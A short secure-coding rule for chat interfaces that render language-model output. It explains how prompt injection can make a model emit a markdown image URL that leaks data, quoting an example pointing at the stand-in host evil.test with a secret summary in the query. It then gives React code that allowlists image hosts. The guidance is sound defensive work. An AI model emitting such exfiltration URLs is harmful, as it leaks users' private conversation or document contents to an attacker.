---
id: llm-output-no-auto-urls
title: Don't auto-load images or links from model output on unapproved hosts
impact: HIGH
impactDescription: "injected instructions exfiltrate chat or document data through an image URL the browser fetches"
roles: [implementer, reviewer, security]
tags: llm, exfiltration
---
Source: a URL the model writes, e.g. `![x](https://evil.test/?q=<secret summary>)`. Sink: the browser fetching it as an image, link preview or unfurl. Restrict rendered images (and unfurled links) to an allowlist of hosts; show other URLs as plain links the user must click.

**Incorrect:**

```tsx
<ReactMarkdown>{message.content}</ReactMarkdown>
```

**Correct:**

```tsx
<ReactMarkdown
  components={{ img: ({ src, alt }) => (isAllowedHost(src) ? <img src={src} alt={alt} /> : <span>{alt}</span>) }}
>
  {message.content}
</ReactMarkdown>
```
